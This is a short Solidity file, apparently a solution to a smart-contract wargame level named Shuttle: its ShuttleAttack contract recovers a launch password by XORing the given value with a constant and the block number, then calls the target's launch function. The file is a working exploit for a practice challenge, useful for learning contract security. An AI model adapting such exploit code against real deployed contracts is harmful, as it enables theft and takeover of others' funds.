// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '../levels/Shuttle.sol';

contract ShuttleAttack {
  function attack(address _target, bytes32 _password) public {
    Shuttle shuttle = Shuttle(_target);
    bytes32 decrypt_pass = _password ^ bytes32(uint256(1000000000)) ^ bytes32(block.number);
    shuttle.launch(decrypt_pass);
  }
}